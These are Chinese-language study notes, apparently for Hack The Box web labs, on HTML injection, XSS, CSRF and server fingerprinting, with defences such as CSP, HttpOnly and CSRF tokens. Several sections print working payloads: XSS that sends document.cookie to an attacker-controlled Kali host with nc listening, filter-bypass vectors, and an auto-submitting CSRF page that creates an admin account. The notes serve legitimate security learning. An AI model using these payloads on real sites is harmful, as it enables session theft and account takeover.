   - 不會：單純的 <a> 標籤只有跳轉功能，沒有直接讀取資料庫或記憶體的權限。
   - 但它是「竊取憑證的引信」：
     透過跳轉將受害者引導至黑客控制的釣魚伺服器，或利用偽協議觸發攻擊。

3. 實戰常見的危險利用型態：
   - 惡意跳轉 (Open Redirect / Phishing)：
     href 指向駭客仿冒的假登入介面，誘騙輸入帳密。
   - JavaScript 偽協議 (直接升級為 XSS)：
     把網址寫成：<a href="javascript:alert(document.cookie)">Click Me</a>
     受害者一點下去，不是跳轉網頁，而是直接在當前頁面執行黑客的 JS 程式碼！
==================================================

==================================================
【實戰解析】打靶時如何把 <a> 標籤注入升級成「偷密碼/Flag」？
==================================================

在 HTB 靶機中，遇到這類輸入框時，黑客通常會按以下三個階段逐步擴大危害：

1. 第一階段：確認注入存在 (PoC)
   - 輸入：`<a href="http://google.com">Click</a>`
   - 驗證：畫面上出現藍色可點擊文字，點了能跳轉，確認 HTML 注入成立[cite: 20]。

2. 第二階段：利用 JavaScript 偽協議彈窗 (升級 XSS)
   - 當題目過濾了 `<script>` 標籤，無法直接插腳本時：
   - 注入：`<a href="javascript:alert(1)">Click Me</a>`
   - 點擊後若彈出警報視窗，代表成功繞過過濾，達成反射型/儲存型 XSS。

3. 第三階段：真正偷走管理員的 Cookie (拿 Flag)
   - 靶機常見劇本：系統後台有模擬管理員定時點開留言板審查。
   - 構造竊取 Payload：
     `<a href="javascript:fetch('http://<你的Kali_IP>:8000/?c='+document.cookie)">Click Me</a>`
     或者直接注入帶有自動加載特性的標籤 (不用等他點)：
     `<img src="http://<你的Kali_IP>:8000/?c=" onerror="fetch('http://<你的Kali_IP>:8000/?c='+document.cookie)">`
   - 在 Kali 終端機開啟監聽：`nc -lvnp 8000`
   - 管理員點開（或載入）頁面的瞬間，終端機立刻噴出管理員的 Session ID / Flag。
==================================================

==================================================
【HTB 筆記】跨站腳本攻擊 (XSS - Cross-Site Scripting)
==================================================

1. 本質定義：
   - 注入點雖然在 HTML/DOM，但核心危害在於成功讓客戶端瀏覽器
     解析並執行未授權的 JavaScript 腳本。

2. XSS 三大類型對比：
   +------------+--------------------+------------------------------+
   | 類型       | 資料傳遞路徑       | 觸發情境                     |
   +------------+--------------------+------------------------------+
   | Reflected  | URL 參數 -> 響應   | 點擊惡意搜尋連結、錯誤頁面   |
   | Stored     | 資料庫 -> 渲染網頁 | 瀏覽含有惡意留言/資料的頁面  |
   | DOM-based  | 前端 JS 本地解析   | 操作 URL Hash/DOM 物件觸發   |
   +------------+--------------------+------------------------------+

3. 核心危害：
   - 會話劫持 (Session Hijacking)：竊取 document.cookie 免密登入。
   - 憑據捕獲 (Credential Harvesting)：偽造前端登入彈窗側錄帳密。
   - 瀏覽器控制 (Browser Exploitation)：配合 BeEF 框架接管受害者瀏覽器。

4. 防禦手段：
   - 輸出編碼 (Context-Aware Encoding)：將 HTML 特殊字元轉為實體編號。
   - Cookie 防護：設定 `HttpOnly` 標記 (JS 將無法透過 document.cookie 讀取)。
   - 內容安全策略 (CSP - Content Security Policy)：限制僅能加載受信任來源的腳本。
==================================================

==================================================
【實戰解析】滲透測試與打靶如何操作 XSS 奪旗？
==================================================

1. 探測與驗證步驟 (PoC)
   - 尋找反射點：輸入特定字串 (如 test1234)，檢查網頁原始碼中是否有回顯。
   - 逃逸與觸發測試：
     * 最基礎：`<script>alert(1)</script>`
     * 繞過標籤過濾 (利用事件屬性)：
       `<img src=x onerror=alert(1)>`
       `<svg onload=alert(1)>`
       `<body onload=alert(1)>`

2. 靶機常見劇本 (模擬後台管理員點擊)
   - 靶機通常會架設一個定時任務 (Bot / Admin Crawler)，每 30 秒自動
     打開後台審查留言板。
   - 實戰奪旗流程：
     1. 在你的 Kali 機上啟動接收端：
        `nc -lvnp 4444` 或 `python3 -m http.server 4444`
     2. 構造竊取 Cookie 的 Stored XSS Payload：
        `<script>fetch('http://<你的Kali_IP>:4444/?flag=' + document.cookie);</script>`
     3. 將 Payload 貼在靶機的留言板或意見反饋欄。
     4. 等待 30 秒管理員 Bot 審查該留言，你的 Kali 終端機就會收到 HTTP 請求，
        裡面帶有管理員的 Cookie 或直接含有 HTB{...} 格式的 Flag。
==================================================

==================================================
【觀念拆解】"><img src=/ onerror=alert(document.cookie)>
==================================================

1. 結構剖析：
   - `">`：語法閉合符。逃逸原本的 HTML 屬性 (如 value="") 與標籤。
   - `<img src=/`：標籤載入。嘗試載入無效圖片路徑，必定觸發失敗。
   - `onerror=...`：事件監聽器。圖片載入失敗時自動執行 JavaScript[cite: 17]。
   - `alert(document.cookie)`：彈出視窗印出使用者的身分憑證 (Cookie)[cite: 17]。

2. 為什麼比 `<script>` 更好用？
   - 繞過 innerHTML 限制：HTML5 規範規定 innerHTML 插入的 <script> 不執行，
     但 <img> 的 onerror 屬於事件屬性，瀏覽器依然會強制執行[cite: 17]。
   - 繞過弱黑名單：很多初階過濾器只封鎖了 "script" 單字，卻忘記過濾 <img> 與 onerror。
==================================================

==================================================
【實戰運用】打靶測試 XSS 的標準檢驗流程
==================================================

在 HTB、PortSwigger 或真實滲透中，遇到任何輸入框（搜尋、留言、個人檔案）時：

1. 階段一：閉合符號測試
   - 先觀察原始碼上下文：
     * 若輸入在標籤屬性內：用 `"><script>...` 或 `"><img ...>`[cite: 17]
     * 若輸入在單引號屬性內：用 `'><img ...>`
     * 若輸入直接在標籤內文 (如 <p>這裡</p>)：直接用 `<img src=x onerror=...>`

2. 階段二：觸發彈窗證明存在 (Proof of Concept)
   - 輸入：`"><img src=x onerror=alert(1)>`
   - 只要螢幕跳出白底黑字的「1」警告視窗，即宣告 XSS 漏洞驗證成功。

3. 階段三：實戰改寫 (把 alert 改成真正竊取憑證)
   - 靶機實戰中，alert 只能拿來拍照交報告，要奪旗拿 Flag 必須把憑證傳回 Kali：
   - 實戰 Payload：
     `"><img src=x onerror="fetch('http://<你的Kali_IP>:8000/?c=' + document.cookie)">`
   - 只要目標使用者（或管理員機器人）刷新頁面，你的 Kali 終端機就能收到 Cookie。
==================================================

==================================================
【實戰思維】Web 滲透測試的「尋找輸入點」標準清單
==================================================

當你在打 Web 靶機時，黑客的直覺就是去翻找所有「資料進出」的管道：

1. 看得見的明面輸入點 (Visible Inputs)
   - 登入 / 註冊表單：測 SQL 注入、弱密碼撞庫、認證繞過。
   - 搜尋引擎 / 留言板：測 XSS (跨站腳本)、HTML 注入。
   - 檔案上傳按鈕：測惡意 WebShell 上傳、路徑遍歷。

2. 藏在背後的隱形輸入點 (Hidden Inputs - F12 / Burp 查看)
   - 網址列 (URL Query Strings)：
     `http://target.com/page.php?file=about.html` -> 測試 LFI (本地檔案包含)。
   - 隱藏欄位 (<input type="hidden">)：
     工程師以為使用者看不到，常把商品價格、權限角色 (role=user) 放在這裡。
   - HTTP 標頭 (Headers)：
     透過 Burp Suite 竄改 User-Agent 或 X-Forwarded-For，測試伺服器端盲注。

結論：
Web 之所以適合入門，正是因為「目標明確」——哪裡能打字、哪裡能傳參數，
那裡就是你放 Payload 的戰場！
==================================================

==================================================
【HTB 筆記】跨站請求偽造 (CSRF - Cross-Site Request Forgery)
==================================================

1. 核心本質：
   - 攻擊者無法直接看到受害者的 Cookie 或回應內容[cite: 19]。
   - 核心手段是「誘使受害者的瀏覽器，在受害者已認證的狀態下，
     向目標 Web 應用程式發送非其本意的惡意 HTTP 請求」[cite: 19]。

2. XSS 與 CSRF 的區別與聯手：
   - XSS (跨站腳本)：攻擊者能執行任意 JS，直接偷取 Cookie 或篡改畫面[cite: 17, 18, 19]。
   - CSRF (跨站請求偽造)：攻擊者拿不到 Cookie，但能強迫瀏覽器帶著 Cookie 做事[cite: 19, 20]。
   - 組合技 (XSS-driven CSRF)：講義中的例子即是透過 XSS 注入外部 exploit.js，
     精準呼叫後台的修改密碼 API，達成全自動帳號劫持[cite: 19]。

3. 核心防禦手段 (Defenses)：
   - CSRF Token (防偽權杖)：
     * 每次表單提交時，必須附帶一段隨機且一次性的 Token。
     * 攻擊者猜不到 Token，偽造的請求就會被伺服器直接拒絕[cite: 20]。
   - SameSite Cookie 屬性：
     * 設定 `SameSite=Strict` 或 `SameSite=Lax`[cite: 20]。
     * 告訴瀏覽器：如果是從「第三方外部網站」發出的跨站請求，
       一律不准自動附帶本站的 Cookie[cite: 20]！
   - 重要操作二次驗證：
     * 修改密碼、轉帳或刪除帳號時，強制要求重新輸入舊密碼或 2FA 驗證碼[cite: 20]。
==================================================

==================================================
【實戰解析】滲透測試與打靶如何利用 CSRF？
==================================================

在 HTB 靶機或實戰演練中，CSRF 通常與「後台審查機器人 (Admin Bot)」搭配出現：

1. 探測關鍵功能是否存在 CSRF
   - 觀察目標網站的敏感動作 (例如 /user/change_email 或 /admin/add_user)：
   - 檢查重點：
     * POST 封包中有沒有 `csrf_token` 參數？[cite: 20]
     * 測試將 `csrf_token` 參數刪除，伺服器是否依然接受？
     * 檢查 Set-Cookie 標頭是否有設定 `SameSite=Strict`？[cite: 20]

2. 構造 CSRF 攻擊頁面 (PoC 攻擊鏈)
   - 若後台有一個「點擊使用者檢舉連結」的 Admin Bot：
   - 滲透員在自己的 Kali 架設惡意網頁 (csrf.html)：
     ```html
     <html>
       <body onload="document.forms[0].submit()">
         <form action="[http://target.htb/admin/create_user](http://target.htb/admin/create_user)" method="POST">
           <input type="hidden" name="username" value="attacker_admin" />
           <input type="hidden" name="password" value="P@ss12345" />
           <input type="hidden" name="role" value="administrator" />
         </form>
       </body>
     </html>
     ```
   - 滲透員將 `http://<Kali_IP>/csrf.html` 提交到靶機的聯絡表單。
   - 管理員點開連結的瞬間，他的瀏覽器自動提交表單，
     幫你在靶機上建立了一組權限最高的管理員帳號！

3. Burp Suite 懶人神器 (實戰常用)
   - 在 Burp Suite 攔截到目標敏感請求時：
   - 按右鍵點選 `Engagement tools` -> `Generate CSRF PoC`。
   - Burp 會一秒自動幫你生成上述完整的 HTML 觸發代碼，直接拿去打靶。
==================================================

==================================================
【HTB 筆記】後端伺服器 (Back-end Server) 結構組成
==================================================

1. 後端架構三大核心模組：
   - Web Server (網頁伺服器)：
     * 作用：處理網路連線、靜態檔案回傳、將動態請求反向代理轉發[cite: 21]。
     * 代表：Apache, Nginx, Microsoft IIS[cite: 21]。
   - Web Application (動態程式邏輯)：
     * 作用：處理身分認證、商務邏輯運算、與資料庫對話[cite: 21]。
     * 代表：PHP, Python, Java, C# (.NET), Node.js[cite: 21]。
   - Database (資料庫)：
     * 作用：持久化存放機密資料與帳密雜湊 (Hash)[cite: 21]。
     * 代表：MySQL, PostgreSQL, MS SQL, Oracle[cite: 21]。

2. 常見技術堆疊 (Web Stacks - 機翻對照)：
   - LAMP：Linux + Apache + MySQL + PHP (最傳統廣泛架構)
   - WISA (機翻「勝利」)：Windows + IIS + SQL Server + ASP.NET (微軟體系)[cite: 22]
   - MEAN / MERN：MongoDB + Express + Angular/React + Node.js (現代全端 JS 體系)
==================================================

==================================================
【實戰思維】打靶第一階段：指紋識別 (Fingerprinting)
==================================================

拿到一個靶機網址，滲透員的第一步就是透過指紋識別，摸清楚後端是用哪套架構：

1. 偵測 Web Server 與作業系統
   - 手動看 HTTP 回應標頭 (Response Headers)：
     `curl -I http://<靶機IP>`
     * 若看到 `Server: Apache/2.4.41 (Ubuntu)` -> 確認為 Linux + Apache[cite: 21]。
     * 若看到 `Server: Microsoft-IIS/10.0` -> 確認為 Windows 主機[cite: 21]。
   - 靶機戰術影響：
     * Windows 找反彈 Shell 要用 PowerShell。
     * Linux 找反彈 Shell 要用 Bash / Python。

2. 辨識後端語言與擴展名
   - 觀察網址後綴與預設頁面：
     * `/index.php` -> 鎖定 PHP 漏洞 (如檔案包含 LFI、反序列化、webshell)。
     * `/default.aspx` -> 鎖定 .NET 漏洞。
     * `/login.do` 或 `.action` -> 鎖定 Java 漏洞 (如 Struts2、Log4j)。

3. 資料庫注入專屬語法 (SQL Injection)
   - 不同的資料庫，注入語法完全不同：
     * MySQL：用 `#` 或 `-- ` 做註解，字串拼接用 `concat()`。
     * MS SQL：用 `--` 註解，支援執行系統指令 `xp_cmdshell` (直接秒拿系統權限)。
     * Oracle：查詢必須帶虛擬表 `FROM dual`[cite: 21]。
   - 知道後端是什麼資料庫，你的 Payload 才能精準命中[cite: 21]！
==================================================
